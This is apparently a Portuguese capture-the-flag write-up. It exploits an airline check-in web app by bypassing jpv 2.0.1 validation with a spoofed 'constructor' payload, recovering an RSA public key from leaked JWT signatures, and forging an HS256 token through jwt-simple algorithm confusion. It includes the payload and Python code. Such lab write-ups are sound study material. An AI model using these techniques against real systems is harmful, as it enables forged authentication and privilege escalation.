## Overview

Temos uma aplicação web de check-in em uma companhia aérea. Existem dois endpoints: /checkin e /upgrades.

A função que recupera a flag é bem óbvia e é mostrada no código a seguir, que é uma requisição do tipo POST para /upgrades/flag:

```js
router.post('/flag', [getLoyaltyStatus], function(req, res, next) {
  if (res.locals.token && res.locals.token.status == "gold") {
    var response = {msg: config.flag };
  } else {
    var response = {msg: "You do not qualify for this upgrade at this time. Please fly with us more."};
  }
  res.json(response);
});
```

Com isso, percebe-se que uma manipulação no token de acesso já nos daria acesso a ela.

Observando as dependências da aplicação, vemos uma versão vulnerável da biblioteca de verificação JPV (JSON Pattern Validator) e também uma versão de jwt-simple desatualizada. Explorando as vulnerbilidades é possível forjar um JWT, alterando o status do passageiro para "gold" e permitindo o acesso à flag.

## Vulnerabilidade JPV 2.0.1

A biblioteca jpv tem como intuito validar inputs de usuário comparando com patterns definidos a priore.

Os seguintes padrões são definidos:

```js
const pattern = {
  firstName: /^\w{1,30}$/,
  lastName: /^\w{1,30}$/,
  passport: /^[0-9]{9}$/,
  ffp: /^(|CA[0-9]{8})$/,
  extras: [
    {sssr: /^(BULK|UMNR|VGML)$/},
  ],
};
```

Porém, na linha 42 de checkin.js existe a verificação ```data["extras"][e]["sssr"] == "FQTU"```
que caso seja verdadeira vaza um token JWT.

Para satisfazer essa verificação e bypassar a validação do jpv, exploramos a vulnerabilidade definida em: https://github.com/manvel-khnkoyan/jpv/issues/6.

A validação do campo extras é feita com um pattern que espera um array de objetos com sssr cujo valor seja uma das strings BULK, UMNR ou VGML. Na prática, em jpv@2.0.1 a verificação de "é array?" foi implementada de forma insegura: a biblioteca checa algo como ```obj.constructor.name === 'Array'``` (ou similar), o que é contornável porque, em JavaScript, o campo constructor de um objeto é mutável (ou é possível fornecer um objeto com ```constructor.name = "Array"```).

Utilzamos um payload como o seguinte:

```js
    "firstName": "Algum",
    "lastName": "Nome",
    "passport": "123456789",
    "ffp": "CA12345678",
    "extras": {
        "x": {
            "sssr": "FQTU"
        },
        "constructor": {
            "name": "Array"
        }
    }
```

Com isso conseguimos vazar tokens diferentes apenas alterando o valor do campo "passport" ou "ffp".

## Vulnerabilidade jwt-simple (algorithm confusion / key misuse)

O JWT tem um campo "alg" no header que indica o algoritmo usado na assinatura (RS256, HS256, etc). RS256 usa RSA (chave privada para assinar, pública para verificar). Já o HS256 usa HMAC-SHA256 (um segredo simétrico compartilhado). No caso desse desafio, está sendo utilizada o algoritmo RS256 como é possível verificar no arquivo ckeckin.js:

```js
function createToken(passport, frequentFlyerNumber) {
  var status = isSpecialCustomer(passport, frequentFlyerNumber) ? "gold" : "bronze";
  var body = {"status": status, "ffp": frequentFlyerNumber};
  return jwt.encode(body, config.privkey, 'RS256');
}
```

Porém, em upgrade.js o token é decodificado assim:

```js
function getLoyaltyStatus(req, res, next) {
  if (req.headers.authorization) {
    let token = req.headers.authorization.split(" ")[1];
    try {
      var decoded = jwt.decode(token, config.pubkey);
    } catch {
      return res.json({ msg: 'Token is not valid.' });
    }
    res.locals.token = decoded;
  }
  next()
}
```

Ou seja, ```jwt.decode(token, key)``` está sendo chamado sem restringir o algoritmo e a chave utilizada é config.pubkey (a chave pública). Em jwt-simple@0.5.2, se o token declara "alg: HS256", a biblioteca tratará config.pubkey como o segredo para HMAC e aplicará HMAC-HS256 para verificar o token, o que é aceitável para jwt-simple, já que ela não valida se a chave é adequada ao algoritmo declarado.

Assim, se soubermos a chave pública (ou a reconstruirmos), podemos criar um JWT com "alg: HS256" e assinar com HMAC-SHA256(secret = PEM_pubkey). O servidor usará o mesmo config.pubkey na verificação e aceitará o token, pois o algoritmo no header foi HS256. Assim transformamos um token de verificação assimétrica (RS256) num token simétrico (HS256) que podemos fabricar localmente.

Continuando, com dois tokens vazados temos recursos para calcular a chave pública a partir da assinatura dos tokens. O algoritmo RS256, após realizar algumas operações de hashing sobre os headers e payload do token em base64 e fazer o padding utilizando o algoritmo PKCS#1 v1.5 (iremos chamar o valor resultante de "pt"), realiza a clássica operação RSA com a assinatura:

```
sig = pt^d mod n  // d = expoente privado
```

A verificação é feita com ```sig^e mod n == pt (mod n)```.

Para encontrar o valor do módulo n e recuperar a chave pública original, usamos uma função auxiliar get_magic() com valores de "e" arbitrários (nesse caso testamos apenas os valores mais comuns e encontramos que foi utilizado o clássico valor 65537):

```python
def get_magic(jwt_token: str, e: int) -> gmpy2.mpz:
    """
    Calcula o valor sig**e - pt para um JWT assinado com RS256.
    """
    header, payload, signature = jwt_token.split(".")
    raw_signature = urlsafe_b64decode(f"{signature}==")
    raw_signature_int = gmpy2.mpz(bytes_to_long(raw_signature))

    padded_msg = pkcs1_v1_5_encode(f"{header}.{payload}".encode(), len(raw_signature))
    padded_int = gmpy2.mpz(bytes_to_long(padded_msg))

    return gmpy2.mpz(pow(raw_signature_int, e) - padded_int)
```

Temos assim um possível k*n (sendo k um número inteiro qualquer). Com os dois tokens diferentes conseguimos tirar o gcd e descobrir o valor do módulo n, tornando possível a recuperação da chave pública:

```python
pubkey = RSA.construct((int(N), int(e)))
pem_rsa = pubkey.export_key()
print("\nChave pública PEM:")
print(pem_rsa)
```

Agora com a chave pública podemos montar o nosso token final. Para conseguir utilizar a chave pública sem saber a chave privada, mudamos o algoritmo de criptografia de RS256 para HS256 no header do JWT.

```{"alg": "HS256", "typ": "JWT"} ```

Testamos também mudar o "alg" para "none" como descrito em https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries, porém sem sucesso.

Assim, utilizamos a chave RSA do formato PEM como string literal para assinar o token forjado com o algoritmo HS256 e alteramos o payload para o status "gold":

```python
message = f"{header_b64}.{payload_b64}"
signature = hmac.new(pem_rsa, message.encode(), hashlib.sha256).digest()
signature_b64 = b64url_encode(signature)
jwt_hs_token = f"{message}.{signature_b64}"
```

Com isso conseguimos forjar um token JWT que passa por todas as verificações e retorna a flag ao enviá-lo para o endpoint /upgrades/flag com uma requisição POST.

```python
headers = {"Authorization": f"Bearer {jwt_hs_token}"}
res = requests.post(f"{URL_BASE}/upgrades/flag", headers=headers).json()
print("\nResposta do servidor:")
print(res)
# FLAG{flag_teste}
```
